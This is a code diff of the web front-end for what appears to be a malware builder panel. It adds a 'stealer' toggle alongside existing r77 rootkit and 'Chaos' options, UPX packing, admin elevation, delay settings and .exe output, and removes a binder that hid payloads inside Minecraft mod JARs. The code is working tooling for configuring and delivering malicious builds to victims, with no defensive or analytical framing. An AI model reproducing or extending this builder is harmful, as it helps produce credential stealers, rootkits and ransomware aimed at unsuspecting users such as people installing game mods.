@@ -112,6 +112,7 @@ function saveFormSettings() {
       jarMcVersion: document.getElementById("jar-mc-version")?.value ?? "1.21.4",
       jarModId: document.getElementById("jar-mod-id")?.value ?? "",
       jarModName: document.getElementById("jar-mod-name")?.value ?? "",
+      enableStealer: document.querySelector('input[name="enable-stealer"]')?.checked ?? false,
       enableR77: document.querySelector('input[name="enable-r77"]')?.checked ?? false,
       enableChaos: document.querySelector('input[name="enable-chaos"]')?.checked ?? false,
       chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value ?? "both",
@@ -172,6 +173,7 @@ function restoreFormSettings() {
     if (s.jarMcVersion !== undefined) setVal("jar-mc-version", s.jarMcVersion);
     if (s.jarModId !== undefined) setVal("jar-mod-id", s.jarModId);
     if (s.jarModName !== undefined) setVal("jar-mod-name", s.jarModName);
+    if (s.enableStealer !== undefined) setCb('input[name="enable-stealer"]', s.enableStealer);
     if (s.enableR77 !== undefined) setCb('input[name="enable-r77"]', s.enableR77);
     if (s.enableChaos !== undefined) setCb('input[name="enable-chaos"]', s.enableChaos);
     if (s.chaosMode !== undefined) {
@@ -539,69 +541,6 @@ if (bindFileInput) {
   });
 }
 
-// ── JAR Mod Binder ────────────────────────────────────────────────────────────
-const MAX_JAR_BOUND_MODS = 3;
-let jarBoundMods = []; // { name, base64 }
-
-const jarBindFileInput = document.getElementById("jar-bind-file-input");
-const jarBoundModsList = document.getElementById("jar-bound-mods-list");
-const jarBindAddLabel = document.getElementById("jar-bind-add-label");
-
-function renderJarBoundMods() {
-  if (!jarBoundModsList) return;
-  jarBoundModsList.innerHTML = "";
-  jarBoundMods.forEach((mod, idx) => {
-    const div = document.createElement("div");
-    div.className = "flex items-center justify-between gap-2 px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-xs";
-    div.innerHTML = `<span class="text-slate-300 truncate flex-1"><i class="fa-brands fa-java text-green-400 mr-1"></i>${mod.name}</span>
-      <button type="button" class="jar-mod-remove text-red-400 hover:text-red-300 px-1" data-idx="${idx}" title="Remove">✕</button>`;
-    div.querySelector(".jar-mod-remove").addEventListener("click", () => {
-      jarBoundMods.splice(idx, 1);
-      renderJarBoundMods();
-      updateJarBindAddVisibility();
-    });
-    jarBoundModsList.appendChild(div);
-  });
-}
-
-function updateJarBindAddVisibility() {
-  if (!jarBindAddLabel) return;
-  jarBindAddLabel.classList.toggle("hidden", jarBoundMods.length >= MAX_JAR_BOUND_MODS);
-}
-
-if (jarBindFileInput) {
-  jarBindFileInput.addEventListener("change", () => {
-    const file = jarBindFileInput.files[0];
-    jarBindFileInput.value = "";
-    if (!file) return;
-    if (jarBoundMods.length >= MAX_JAR_BOUND_MODS) {
-      alert(`Maximum ${MAX_JAR_BOUND_MODS} JAR mods can be bound.`);
-      return;
-    }
-    if (!file.name.toLowerCase().endsWith(".jar")) {
-      alert("Only .jar files can be bound as mods.");
-      return;
-    }
-    if (file.size > MAX_BIND_FILE_BYTES) {
-      alert(`Bound mod must be under 10 MB. "${file.name}" is too large.`);
-      return;
-    }
-    const safeName = sanitizeBindName(file.name);
-    if (jarBoundMods.some((m) => m.name === safeName)) {
-      alert(`A mod named "${safeName}" is already in the list.`);
-      return;
-    }
-    const reader = new FileReader();
-    reader.onload = () => {
-      const base64 = reader.result.split(",")[1];
-      jarBoundMods.push({ name: safeName, base64 });
-      renderJarBoundMods();
-      updateJarBindAddVisibility();
-    };
-    reader.readAsDataURL(file);
-  });
-}
-
 async function init() {
   try {
     updateServerUrlPlaceholder();
@@ -745,8 +684,6 @@ form?.addEventListener("submit", async (e) => {
   const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
   const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
   const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
-  const jitterPercentRaw = parseInt(form.querySelector("#jitter-percent")?.value || "20", 10);
-  const jitterPercent = !isNaN(jitterPercentRaw) && jitterPercentRaw >= 0 && jitterPercentRaw <= 50 ? jitterPercentRaw : 20;
 
   const buildConfig = {
     platforms,
@@ -774,7 +711,6 @@ form?.addEventListener("submit", async (e) => {
     requireAdmin,
     outputExtension,
     sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
-    jitterPercent,
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
@@ -789,6 +725,7 @@ form?.addEventListener("submit", async (e) => {
     jarModId: document.getElementById("jar-mod-id")?.value?.trim() || undefined,
     jarModName: document.getElementById("jar-mod-name")?.value?.trim() || undefined,
     jarBoundMods: jarBoundMods.length > 0 ? jarBoundMods.map((m) => ({ name: m.name, data: m.base64 })) : undefined,
+    enableStealer: form.querySelector('input[name="enable-stealer"]')?.checked || false,
     enableR77: form.querySelector('input[name="enable-r77"]')?.checked || false,
     enableChaos: form.querySelector('input[name="enable-chaos"]')?.checked || false,
     chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value || "both",
@@ -1058,8 +995,7 @@ function showBuildFiles(files, buildId, expiresAt) {
     fileInfo.appendChild(fileSize);
 
     const downloadBtn = document.createElement("a");
-    downloadBtn.href = file.tempShUrl || `/api/build/download/${encodeURIComponent(file.name)}`;
-    if (file.tempShUrl) downloadBtn.target = "_blank";
+    downloadBtn.href = `/api/build/download/${encodeURIComponent(file.name)}`;
     downloadBtn.className =
       "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
     downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';
@@ -1370,8 +1306,8 @@ function showBuildFilesForContainer(build, containerId, timerId) {
     fileMeta.appendChild(fileText);
 
     const download = document.createElement("a");
-    download.href = file.tempShUrl || `/api/build/download/${encodeURIComponent(file.filename)}`;
-    if (file.tempShUrl) { download.target = "_blank"; } else { download.download = ""; }
+    download.href = `/api/build/download/${encodeURIComponent(file.filename)}`;
+    download.download = "";
     download.className =
       "px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors flex items-center gap-2";
     const downloadIcon = document.createElement("i");
